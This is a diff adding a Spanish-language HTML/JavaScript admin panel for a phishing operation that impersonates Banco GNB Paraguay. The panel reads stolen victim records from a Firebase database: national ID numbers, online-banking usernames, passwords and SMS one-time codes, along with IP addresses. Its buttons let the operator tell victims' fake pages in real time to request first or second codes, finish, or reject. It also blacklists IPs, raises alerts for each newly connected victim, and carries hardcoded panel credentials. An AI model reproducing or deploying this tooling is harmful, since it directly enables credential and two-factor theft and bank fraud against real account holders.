@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PANEL · GNB</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{
+    --bg:#04120c; --panel:#071d14; --line:#123a2a;
+    --green:#7AB83F; --green-deep:#3d6b1f;
+    --red:#c8323c; --amber:#f59e0b; --blue:#0574AF; --violet:#7c3aed; --sky:#0ea5e9;
+    --muted:#5f8069; --text:#e2f0e6;
+    --cols:92px 96px 104px 112px 112px 96px 96px 128px 76px 1fr;
+  }
+  body{background:var(--bg);font-family:'JetBrains Mono',monospace;color:var(--text);overflow-x:hidden}
+  .header{background:linear-gradient(180deg,#062418,#04140d);border-bottom:2px solid var(--green-deep);padding:12px 22px;display:flex;justify-content:space-between;align-items:center;gap:14px;position:sticky;top:0;z-index:100;flex-wrap:wrap}
+  .brand{display:flex;align-items:center;gap:12px}
+  .brand-logo{background:#fff;border-radius:8px;padding:5px 9px;flex:none}
+  .brand-logo img{height:30px;width:auto;display:block}
+  .brand-txt{font-family:'Orbitron',sans-serif;font-size:18px;font-weight:900;letter-spacing:2px;background:linear-gradient(90deg,#7AB83F,#c8f08f);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-transform:uppercase;line-height:1}
+  .brand-sub{font-size:9px;color:var(--muted);letter-spacing:3px;margin-top:4px}
+  .db-badge{font-size:8px;padding:2px 7px;border-radius:6px;letter-spacing:1px;font-weight:bold;border:1px solid}
+  .db-local{background:#231a06;border-color:var(--amber);color:#fbbf24}
+  .db-fb{background:#07301c;border-color:var(--green);color:#a8e06a}
+  .stats-bar{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+  .stat-item{background:#08251a;border:1px solid var(--line);padding:7px 14px;border-radius:8px;font-size:11px;color:var(--muted);letter-spacing:1px}
+  .stat-item span{font-weight:bold}
+  .btns{display:flex;gap:8px;flex-wrap:wrap}
+  .btn-header{padding:9px 16px;border:none;border-radius:8px;font-family:inherit;font-size:11px;font-weight:bold;cursor:pointer;transition:all .25s;text-transform:uppercase;letter-spacing:1px}
+  .btn-dark{background:#08251a;border:1px solid #1a5537;color:#8fbfa0}
+  .btn-dark:hover{border-color:var(--green);color:var(--green)}
+  .btn-dark.activo{background:#0d3a24;border-color:var(--green);color:var(--green);box-shadow:0 0 0 1px rgba(122,184,63,.35)}
+  .btn-pink{background:#8c1d26;color:#fff}
+  .btn-pink:hover{background:#b3252e}
+  .table-container{padding:18px 22px 60px}
+  .toolbar{display:flex;gap:10px;align-items:center;margin-bottom:14px;flex-wrap:wrap}
+  .search-wrap{position:relative;flex:1;min-width:220px;max-width:430px}
+  .search-wrap input{width:100%;background:#08251a;border:1px solid var(--line);border-radius:8px;padding:11px 38px 11px 14px;color:var(--text);font-family:inherit;font-size:12px;outline:none}
+  .search-wrap input:focus{border-color:var(--green);box-shadow:0 0 0 2px rgba(122,184,63,.18)}
+  .search-wrap input::placeholder{color:#3f6b52}
+  .search-wrap .ico{position:absolute;right:13px;top:50%;transform:translateY(-50%);color:var(--muted);font-size:12px;pointer-events:none}
+  .btn-clear,.btn-quick{background:#0a3020;border:1px solid var(--line);color:#8fbfa0;border-radius:8px;padding:11px 15px;font-size:10px;cursor:pointer;font-family:inherit;text-transform:uppercase;letter-spacing:1px;font-weight:bold}
+  .btn-clear:hover{border-color:var(--red);color:#ef4444}
+  .btn-quick:hover{border-color:var(--green);color:var(--green)}
+  .res-info{font-size:10px;color:var(--muted);letter-spacing:1px}
+  .res-info b{color:var(--green)}
+  .table-header{display:grid;grid-template-columns:var(--cols);gap:10px;padding:14px;background:#061a11;border-bottom:2px solid var(--green-deep);font-size:9px;text-transform:uppercase;letter-spacing:1.5px;color:var(--muted);font-weight:bold}
+  .data-row{display:grid;grid-template-columns:var(--cols);gap:10px;padding:14px 10px;background:var(--panel);border-left:4px solid var(--green);margin-bottom:7px;align-items:center;transition:all .25s;border-radius:0 6px 6px 0}
+  .data-row:hover{background:#0b2b1c}
+  .data-row.offline{border-left-color:#1d4a34;opacity:.5}
+  .data-row.ip-bloqueada{border-left-color:#dc2626;background:#160607}
+  .data-row.esperando-otp{border-left-color:var(--amber);background:#151004}
+  .data-row.codigo{border-left-color:var(--green);background:#062b1c}
+  .data-row.reenvio{border-left-color:var(--sky);background:#04212e;box-shadow:inset 0 0 0 1px rgba(14,165,233,.35)}
+  .data-row.destacado{box-shadow:inset 0 0 0 1px rgba(122,184,63,.35)}
+  .cell-status{display:flex;align-items:center;gap:7px;font-size:10px;font-weight:bold;flex-wrap:wrap}
+  .live-dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:blink 1.5s infinite;box-shadow:0 0 8px var(--green)}
+  .offline-dot{width:8px;height:8px;background:#33566a;border-radius:50%}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
+  .cell-pagina{font-size:9px;color:var(--amber);text-transform:uppercase;word-break:break-all}
+  .cell-pagina.offline{color:var(--muted)}
+  .cell-pagina.pag-index{color:var(--blue)}
+  .cell-pagina.pag-cargando{color:var(--amber);font-weight:bold}
+  .cell-pagina.pag-otp{color:var(--green);font-weight:bold}
+  .tag-reenvio{display:inline-block;background:#04212e;border:1px solid var(--sky);color:#7dd3fc;padding:1px 7px;border-radius:8px;font-size:8px;font-weight:bold;animation:pulso 1.4s infinite}
+  .tag-reenvio2{background:#0b2233;border-color:#38bdf8;color:#a5dffb}
+  @keyframes pulso{0%,100%{opacity:1}50%{opacity:.45}}
+  .cell-doc{color:#a8e06a;font-weight:bold;font-size:12px;word-break:break-all}
+  .cell-user{color:#5cb3e8;font-weight:bold;font-size:12px;word-break:break-all}
+  .cell-pass{color:#f0857f;font-weight:bold;font-size:12px;word-break:break-all}
+  .cell-token{color:var(--green);font-weight:bold;font-size:13px;background:#062b1c;padding:5px 8px;border-radius:5px;text-align:center;border:1px solid var(--green);letter-spacing:2px}
+  .cell-token.vacio{color:#3f6b52;background:#0b2418;border:1px solid #1a5537;font-weight:400}
+  .cell-token2{color:#5cb3e8;font-weight:bold;font-size:13px;background:#06222e;padding:5px 8px;border-radius:5px;text-align:center;border:1px solid var(--blue);letter-spacing:2px}
+  .cell-token2.vacio{color:#3f6b52;background:#0b2418;border:1px solid #1a5537;font-weight:400}
+  .cell-ip{color:#8fbfa0;font-size:10px;word-break:break-all}
+  .cell-ip.bloqueada{color:#ef4444;font-weight:bold}
+  .cell-tiempo{font-size:10px;color:var(--muted)}
+  .actions{display:flex;gap:4px;justify-content:flex-end;flex-wrap:wrap}
+  .btn-action{padding:5px 9px;border:none;border-radius:4px;font-family:inherit;font-size:8px;font-weight:bold;cursor:pointer;text-transform:uppercase;letter-spacing:.5px}
+  .btn-action:hover{opacity:.8}
+  .btn-action:disabled{opacity:.35;cursor:default}
+  .btn-sms1{background:#b45309;color:#fff}
+  .btn-sms2{background:#0b5d8a;color:#fff}
+  .btn-go{background:var(--green-deep);color:#fff}
+  .btn-reject{background:#1a5537;color:#a9d4ba}
+  .btn-delete{background:#a11c25;color:#fff}
+  .btn-block{background:var(--violet);color:#fff}
+  .badge-count{background:var(--green);color:#04210f;padding:1px 6px;border-radius:8px;font-size:9px;margin-left:4px;font-weight:bold}
+  .empty{text-align:center;padding:60px;color:var(--muted);font-size:12px;letter-spacing:1px}
+  #login-overlay{position:fixed;inset:0;background:radial-gradient(circle at 50% 30%,#0a3323,#000);z-index:1000;display:flex;align-items:center;justify-content:center;padding:20px}
+  .login-box{background:#061d14;border:2px solid var(--green-deep);padding:40px 36px;border-radius:12px;width:100%;max-width:390px;text-align:center}
+  .login-logo{background:#fff;border-radius:10px;padding:14px 18px;margin:0 auto 18px;display:inline-block}
+  .login-logo img{width:170px;height:auto;display:block}
+  .login-box h2{font-family:'Orbitron',sans-serif;font-size:18px;margin-bottom:6px;color:var(--green);letter-spacing:3px}
+  .login-box .sub{font-size:9px;color:var(--muted);letter-spacing:3px;margin-bottom:24px;text-transform:uppercase}
+  .login-box input{width:100%;background:#08251a;border:1px solid #1a5537;padding:14px;margin-bottom:12px;color:#fff;font-family:inherit;font-size:13px;border-radius:6px;outline:none}
+  .login-box input:focus{border-color:var(--green)}
+  .login-box button{width:100%;background:var(--green-deep);color:#fff;border:none;padding:15px;font-family:inherit;font-weight:bold;cursor:pointer;border-radius:6px;text-transform:uppercase;letter-spacing:3px;margin-top:8px}
+  .login-box button:hover{background:#4d8626}
+  .notificacion-flotante{position:fixed;top:80px;right:22px;background:#04212e;border:2px solid var(--sky);color:#bae6fd;padding:14px 20px;border-radius:10px;font-size:12px;font-weight:bold;opacity:0;transform:translateX(120%);transition:all .35s;z-index:2000;box-shadow:0 8px 24px rgba(0,0,0,.5);max-width:320px}
+  .notificacion-flotante.mostrar{opacity:1;transform:translateX(0)}
+  #barra-error{background:#2a0d10;border-bottom:1px solid #dc2626;color:#f87171;padding:9px 22px;font-size:11px;display:none}
+  .footer-bar{position:fixed;bottom:0;left:0;right:0;background:#061a11;border-top:1px solid var(--line);padding:6px 22px;font-size:9px;color:var(--muted);letter-spacing:1px;display:flex;justify-content:space-between;z-index:90}
+  .footer-bar b{color:var(--green)}
+</style>
+</head>
+<body>
+
+<audio id="notif-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
+<div id="notificacion" class="notificacion-flotante">
+  <i class="fa-solid fa-bell"></i> <span id="notificacion-texto">Nuevo cliente</span>
+</div>
+
+<div id="login-overlay">
+  <div class="login-box">
+    <div class="login-logo"><img src="https://www.bancognb.com.py/bancaweb/img/brand/new-logo-gnb-fusion.svg" alt="GNB"></div>
+    <h2>ACCESO PANEL</h2>
+    <div class="sub">Banco GNB Paraguay</div>
+    <input type="text" id="admin-user" placeholder="USUARIO">
+    <input type="password" id="admin-pass" placeholder="CONTRASEÑA">
+    <button onclick="validarAcceso()">ENTRAR</button>
+    <p id="error-msg" style="color:#ef4444;margin-top:14px;display:none;font-size:11px">Credenciales incorrectas</p>
+  </div>
+</div>
+
+<div id="panel-content" style="display:none">
+  <div class="header">
+    <div class="brand">
+      <div class="brand-logo"><img src="https://www.bancognb.com.py/bancaweb/img/brand/new-logo-gnb-fusion.svg" alt="GNB"></div>
+      <div>
+        <div class="brand-txt">Panel GNB</div>
+        <div class="brand-sub">SISTEMA PROTEGIDO</div>
+      </div>
+      <span id="db-badge" class="db-badge db-local">LOCAL</span>
+    </div>
+    <div class="stats-bar">
+      <div class="stat-item">TOTAL: <span id="stat-total">0</span></div>
+      <div class="stat-item">LIVE: <span id="stat-online" style="color:#7AB83F">0</span></div>
+      <div class="stat-item">OFF: <span id="stat-offline" style="color:#5f8069">0</span></div>
+      <div class="stat-item">COD: <span id="stat-codigo" style="color:#f59e0b">0</span></div>
+      <div class="stat-item">REENV: <span id="stat-reenv" style="color:#0ea5e9">0</span></div>
+      <div class="stat-item">BLOQ: <span id="stat-bloq" style="color:#dc2626">0</span></div>
+    </div>
+    <div class="btns">
+      <button class="btn-header btn-dark activo" data-vista="usuarios" onclick="setVista(this)">Usuarios</button>
+      <button class="btn-header btn-dark" data-vista="validos" onclick="setVista(this)">Válidos</button>
+      <button class="btn-header btn-dark" data-vista="bloqueadas" onclick="setVista(this)">Bloqueadas <span class="badge-count" id="n-bloq">0</span></button>
+      <button class="btn-header btn-dark" data-vista="eliminados" onclick="setVista(this)">Eliminados <span class="badge-count" id="n-del">0</span></button>
+      <button class="btn-header btn-dark" data-vista="ocultos" onclick="setVista(this)">Ocultos <span class="badge-count" id="n-ocu">0</span></button>
+      <button class="btn-header btn-pink" onclick="limpiarTodo()">Limpiar</button>
+      <button class="btn-header btn-dark" onclick="probarSonido()">🔔 Sonido</button>
+      <button class="btn-header btn-dark" onclick="cerrarSesion()">Salir</button>
+    </div>
+  </div>
+
+  <div id="barra-error"></div>
+
+  <div class="table-container">
+    <div class="toolbar">
+      <div class="search-wrap">
+        <input id="buscador" type="text" placeholder="Buscar documento, usuario, clave, IP o estado..." oninput="setFiltro(this.value)">
+        <i class="fa-solid fa-magnifying-glass ico"></i>
+      </div>
+      <button class="btn-clear" onclick="limpiarFiltro()">Limpiar filtro</button>
+      <button class="btn-quick" onclick="setFiltro('esperando')">En espera</button>
+      <button class="btn-quick" onclick="setFiltro('codigo')">En código</button>
+      <button class="btn-quick" onclick="setFiltro('reenvio')">Reenvíos</button>
+      <span class="res-info" id="res-info"></span>
+    </div>
+
+    <div class="table-header">
+      <div>ESTADO</div><div>PÁGINA</div><div>DOCUMENTO</div><div>USUARIO</div><div>CLAVE</div>
+      <div>TOKEN</div><div>TOKEN 2</div><div>IP</div><div>ÚLTIMO</div><div style="text-align:right">ACCIONES</div>
+    </div>
+    <div id="container"><div class="empty">CARGANDO...</div></div>
+  </div>
+
+  <div class="footer-bar">
+    <span>GNB · <b id="f-total">0</b> registros</span>
+    <span>Firebase: <b id="f-db">—</b></span>
+  </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+<script>
+var CFG = { DB_URL: "https://cbonnlineec-default-rtdb.firebaseio.com/", ROOT: "nbch", REDIRECT_BLOQUEADO: "https://www.google.com" };
+var ADMIN_USER = 'Ghost';
+var ADMIN_PASS = 'Cabimas01.';
+
+/* ---------- capa de datos con respaldo local ---------- */
+var DBX = (function(){
+  var KEY='nbch_db';
+  var vacio=function(){ return {usuarios:{},comandos:{},eliminados:{},blacklist:{},historial:{},ocultos:{}}; };
+  var fb=null, subs=[];
+  var leer=function(){ try{ var t=JSON.parse(localStorage.getItem(KEY))||vacio(); t.usuarios=t.usuarios||{}; t.comandos=t.comandos||{}; t.blacklist=t.blacklist||{}; return t; }catch(e){ return vacio(); } };
+  var guardar=function(t){ try{ localStorage.setItem(KEY, JSON.stringify(t)); }catch(e){} };
+  var emitir=function(){ subs.forEach(function(f){ try{ f(); }catch(e){} }); };
+
+  function conectar(){
+    try{
+      firebase.initializeApp({ databaseURL: CFG.DB_URL });
+      fb = firebase.database();
+      document.getElementById('db-badge').className='db-badge db-fb';
+      document.getElementById('db-badge').textContent='FIREBASE';
+      document.getElementById('f-db').textContent='conectado';
+      ['usuarios','comandos','blacklist','ocultos'].forEach(function(n){
+        fb.ref(CFG.ROOT+'/'+n).on('value', function(s){
+          var t=leer(); t[n]=s.val()||{}; guardar(t); emitir();
+        }, function(e){ error('Firebase: '+e.message); });
+      });
+    }catch(e){ error('Firebase no disponible, modo local'); }
+  }
+
+  return {
+    iniciar: conectar,
+    suscribir: function(f){ subs.push(f); },
+    todo: leer,
+    guardar: guardar,
+    set: function(nodo, id, obj){
+      var t=leer(); t[nodo]=t[nodo]||{}; t[nodo][id]=obj; guardar(t);
+      if(fb){ fb.ref(CFG.ROOT+'/'+nodo+'/'+id).set(obj); }
+      emitir();
+    },
+    update: function(nodo, id, obj){
+      var t=leer(); t[nodo]=t[nodo]||{}; t[nodo][id]=Object.assign(t[nodo][id]||{}, obj); guardar(t);
+      if(fb){ fb.ref(CFG.ROOT+'/'+nodo+'/'+id).update(obj); }
+      emitir();
+    },
+    borrar: function(nodo, id){
+      var t=leer(); if(t[nodo]) delete t[nodo][id]; guardar(t);
+      if(fb){ fb.ref(CFG.ROOT+'/'+nodo+'/'+id).remove(); }
+      emitir();
+    }
+  };
+})();
+
+var vista='usuarios', filtro='', audioAutorizado=false, ultimoConteo=-1;
+var vistoReenvio={}, vistoReenvio2={}, baseLista=false;
+
+/* ---------- utilidades ---------- */
+function error(m){
+  var b=document.getElementById('barra-error');
+  b.textContent=m; b.style.display='block';
+  setTimeout(function(){ b.style.display='none'; }, 6000);
+}
+function esc(v){
+  return String(v==null?'':v).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+function hora(ts){
+  if(!ts) return '—';
+  var d=new Date(ts), dif=Math.floor((Date.now()-ts)/1000);
+  if(dif<60) return dif+'s';
+  if(dif<3600) return Math.floor(dif/60)+'m';
+  return ('0'+d.getHours()).slice(-2)+':'+('0'+d.getMinutes()).slice(-2);
+}
+function sonar(){
+  if(!audioAutorizado) return;
+  var a=document.getElementById('notif-sound');
+  try{ a.currentTime=0; a.play(); }catch(e){}
+}
+function notificar(txt){
+  var n=document.getElementById('notificacion');
+  document.getElementById('notificacion-texto').textContent=txt;
+  n.classList.add('mostrar');
+  setTimeout(function(){ n.classList.remove('mostrar'); },4200);
+  sonar();
+}
+
+/* ---------- acceso ---------- */
+function validarAcceso(){
+  if(document.getElementById('admin-user').value===ADMIN_USER && document.getElementById('admin-pass').value===ADMIN_PASS){
+    sessionStorage.setItem('auth_panel_gnb','true'); entrar();
+  } else document.getElementById('error-msg').style.display='block';
+}
+function entrar(){
+  document.getElementById('login-overlay').style.display='none';
+  document.getElementById('panel-content').style.display='block';
+  audioAutorizado=true;
+  DBX.iniciar();
+  DBX.suscribir(render);
+  render();
+}
+function cerrarSesion(){
+  sessionStorage.removeItem('auth_panel_gnb');
+  location.reload();
+}
+function probarSonido(){
+  audioAutorizado=true; sonar(); notificar('Sonido de prueba');
+}
+
+/* ---------- vistas y filtros ---------- */
+function setVista(el){
+  [].forEach.call(document.querySelectorAll('[data-vista]'), function(b){ b.classList.remove('activo'); });
+  el.classList.add('activo');
+  vista=el.getAttribute('data-vista');
+  render();
+}
+function setFiltro(v){ filtro=(v||'').toLowerCase(); render(); }
+function limpiarFiltro(){ filtro=''; document.getElementById('buscador').value=''; render(); }
+function limpiarTodo(){
+  if(!confirm('¿Eliminar todos los registros de esta vista?')) return;
+  var t=DBX.todo();
+  Object.keys(t.usuarios).forEach(function(id){
+    if(vista==='eliminados') DBX.borrar('usuarios',id);
+    else if(vista==='ocultos') DBX.update('usuarios',id,{oculto:false});
+    else DBX.update('usuarios',id,{eliminado:true});
+  });
+}
+
+/* ---------- acciones ---------- */
+function comando(id, accion, estado){
+  DBX.set('comandos', id, { accion: accion, ts: Date.now() });
+  if(estado) DBX.update('usuarios', id, { status: estado, ts: Date.now() });
+  notificar(accion.toUpperCase()+' → '+id.slice(0,6));
+}
+function accion(id, a){
+  var u = DBX.todo().usuarios[id] || {};
+  if(a==='token')  comando(id,'token','PIDE CODIGO');
+  if(a==='token2') comando(id,'token2','PIDE CODIGO 2');
+  if(a==='dejar')  comando(id,'dejar','FINALIZADO');
+  if(a==='rechazar') comando(id,'rechazar','RECHAZADO');
+  if(a==='ocultar') DBX.update('usuarios',id,{oculto:!u.oculto});
+  if(a==='eliminar') DBX.update('usuarios',id,{eliminado:!u.eliminado});
+  if(a==='ip'){
+    if(!u.ip){ error('Sin IP registrada'); return; }
+    DBX.set('blacklist', u.ip.replace(/\./g,'_'), {ip:u.ip, ts:Date.now()});
+    notificar('IP bloqueada: '+u.ip);
+  }
+}
+
+/* ---------- render ---------- */
+function claseEstado(st){
+  var s=(st||'').toUpperCase();
+  if(s.indexOf('RECHAZ')>-1) return 'offline';
+  if(s.indexOf('CODIGO')>-1||s.indexOf('CÓDIGO')>-1) return 'codigo';
+  if(s.indexOf('VERIFIC')>-1||s.indexOf('PIDE')>-1||s.indexOf('ESPERANDO')>-1) return 'esperando-otp';
+  return '';
+}
+function clasePagina(st){
+  var s=(st||'').toUpperCase();
+  if(s.indexOf('CODIGO')>-1) return 'pag-otp';
+  if(s.indexOf('VERIFIC')>-1||s.indexOf('PIDE')>-1) return 'pag-cargando';
+  if(s==='CLAVE') return 'pag-index';
+  return 'offline';
+}
+
+function render(){
+  var t=DBX.todo();
+  var usuarios=t.usuarios, blacklist=t.blacklist;
+
+  var ids=Object.keys(usuarios).map(function(id){ return {id:id, d:usuarios[id]||{}}; });
+  ids.sort(function(a,b){ return (b.d.ts||0)-(a.d.ts||0); });
+
+  /* ---- detección de reenvíos ---- */
+  ids.forEach(function(x){
+    var d=x.d, id=x.id;
+    if(d.reenvio){
+      if(vistoReenvio[id] === undefined){
+        vistoReenvio[id]=d.reenvio;
+        if(baseLista) notificar('Reenvío de código · '+(d.documento||d.usuario||id.slice(0,6)));
+      } else if(d.reenvio > vistoReenvio[id]){
+        vistoReenvio[id]=d.reenvio;
+        notificar('PIDIÓ REENVIAR CÓDIGO · '+(d.documento||d.usuario||id.slice(0,6)));
+      }
+    }
+    if(d.reenvio2){
+      if(vistoReenvio2[id] === undefined){
+        vistoReenvio2[id]=d.reenvio2;
+      } else if(d.reenvio2 > vistoReenvio2[id]){
+        vistoReenvio2[id]=d.reenvio2;
+        notificar('PIDIÓ REENVIAR CÓDIGO 2 · '+(d.documento||d.usuario||id.slice(0,6)));
+      }
+    }
+  });
+
+  var total=ids.length, online=0, offline=0, cod=0, bloq=0, reenv=0;
+  ids.forEach(function(x){
+    var s=(x.d.status||'').toUpperCase();
+    var ipKey=(x.d.ip||'').replace(/\./g,'_');
+    if(blacklist[ipKey]) bloq++;
+    if(s.indexOf('CODIGO')>-1||s.indexOf('CÓDIGO')>-1) cod++;
+    if(x.d.reenvios || x.d.reenvios2) reenv++;
+    if(s.indexOf('FINAL')>-1||s.indexOf('RECHAZ')>-1) offline++; else online++;
+  });
+  document.getElementById('stat-total').textContent=total;
+  document.getElementById('stat-online').textContent=online;
+  document.getElementById('stat-offline').textContent=offline;
+  document.getElementById('stat-codigo').textContent=cod;
+  document.getElementById('stat-reenv').textContent=reenv;
+  document.getElementById('stat-bloq').textContent=bloq;
+  document.getElementById('n-bloq').textContent=Object.keys(blacklist).length;
+  document.getElementById('n-del').textContent=ids.filter(function(x){ return x.d.eliminado; }).length;
+  document.getElementById('n-ocu').textContent=ids.filter(function(x){ return x.d.oculto; }).length;
+  document.getElementById('f-total').textContent=total;
+
+  if(total>ultimoConteo && ultimoConteo>=0) notificar('Nuevo cliente conectado');
+  ultimoConteo=total;
+  baseLista=true;
+
+  var lista=ids.filter(function(x){
+    var d=x.d;
+    if(vista==='eliminados') return !!d.eliminado;
+    if(vista==='ocultos') return !!d.oculto && !d.eliminado;
+    if(d.eliminado||d.oculto) return false;
+    if(vista==='validos') return (d.status||'').toUpperCase().indexOf('FINAL')>-1;
+    if(vista==='bloqueadas') return !!blacklist[(d.ip||'').replace(/\./g,'_')];
+    return true;
+  });
+
+  if(filtro){
+    lista=lista.filter(function(x){
+      var d=x.d;
+      if(filtro==='reenvio') return !!(d.reenvios||d.reenvios2);
+      if(filtro==='esperando') return (d.status||'').toUpperCase().indexOf('VERIFIC')>-1;
+      if(filtro==='codigo') return (d.status||'').toUpperCase().indexOf('CODIGO')>-1;
+      return (d.documento||'').toLowerCase().indexOf(filtro)>-1
+        || (d.usuario||'').toLowerCase().indexOf(filtro)>-1
+        || (d.clave||'').toLowerCase().indexOf(filtro)>-1
+        || (d.ip||'').toLowerCase().indexOf(filtro)>-1
+        || (d.status||'').toLowerCase().indexOf(filtro)>-1
+        || (d.sms||'').indexOf(filtro)>-1;
+    });
+  }
+
+  document.getElementById('res-info').innerHTML = lista.length+' de <b>'+total+'</b>';
+
+  var cont=document.getElementById('container');
+  if(!lista.length){ cont.innerHTML='<div class="empty">SIN REGISTROS</div>'; return; }
+
+  cont.innerHTML=lista.map(function(x){
+    var d=x.d, id=x.id;
+    var ipKey=(d.ip||'').replace(/\./g,'_');
+    var enBlack=!!blacklist[ipKey];
+    var cls=claseEstado(d.status);
+    if(enBlack) cls+=' ip-bloqueada';
+    var reciente = d.reenvio && (Date.now()-d.reenvio < 60000);
+    if(reciente) cls+=' reenvio';
+    var st=(d.status||'—');
+    var vivo = cls.indexOf('offline')<0 && !enBlack;
+
+    var etiquetas='';
+    if(d.reenvios) etiquetas += '<span class="tag-reenvio">REENVIÓ x'+esc(d.reenvios)+'</span>';
+    if(d.reenvios2) etiquetas += '<span class="tag-reenvio tag-reenvio2">CÓD.2 x'+esc(d.reenvios2)+'</span>';
+
+    return '<div class="data-row '+cls+'">'+
+      '<div class="cell-status"><span class="'+(vivo?'live-dot':'offline-dot')+'"></span>'+esc(st)+etiquetas+'</div>'+
+      '<div class="cell-pagina '+clasePagina(d.status)+'">'+esc(d.origen==='gnb'?'GNB':'—')+'</div>'+
+      '<div class="cell-doc">'+esc(d.documento||'—')+'</div>'+
+      '<div class="cell-user">'+esc(d.usuario||'—')+'</div>'+
+      '<div class="cell-pass">'+esc(d.clave||'—')+'</div>'+
+      '<div class="cell-token'+(d.sms?'':' vacio')+'">'+esc(d.sms||'—')+'</div>'+
+      '<div class="cell-token2'+(d.sms2?'':' vacio')+'">'+esc(d.sms2||'—')+'</div>'+
+      '<div class="cell-ip'+(enBlack?' bloqueada':'')+'">'+esc(d.ip||'—')+'</div>'+
+      '<div class="cell-tiempo">'+hora(d.ts)+'</div>'+
+      '<div class="actions">'+
+        '<button class="btn-action btn-sms1" onclick="accion(\''+id+'\',\'token\')">Código</button>'+
+        '<button class="btn-action btn-sms2" onclick="accion(\''+id+'\',\'token2\')">Cód 2</button>'+
+        '<button class="btn-action btn-go" onclick="accion(\''+id+'\',\'dejar\')">Dejar</button>'+
+        '<button class="btn-action btn-reject" onclick="accion(\''+id+'\',\'rechazar\')">Rechazar</button>'+
+        '<button class="btn-action btn-block" onclick="accion(\''+id+'\',\'ocultar\')">'+(d.oculto?'Ver':'Ocultar')+'</button>'+
+        '<button class="btn-action btn-delete" onclick="accion(\''+id+'\',\'eliminar\')">'+(d.eliminado?'Restaurar':'Eliminar')+'</button>'+
+        '<button class="btn-action btn-block" onclick="accion(\''+id+'\',\'ip\')"'+(enBlack?' disabled':'')+'>'+(enBlack?'Bloq.':'IP')+'</button>'+
+      '</div>'+
+    '</div>';
+  }).join('');
+}
+
+/* ---------- arranque ---------- */
+if(sessionStorage.getItem('auth_panel_gnb')==='true') entrar();
+document.getElementById('admin-pass').addEventListener('keydown', function(e){ if(e.key==='Enter') validarAcceso(); });
+</script>
+</body>
+</html>
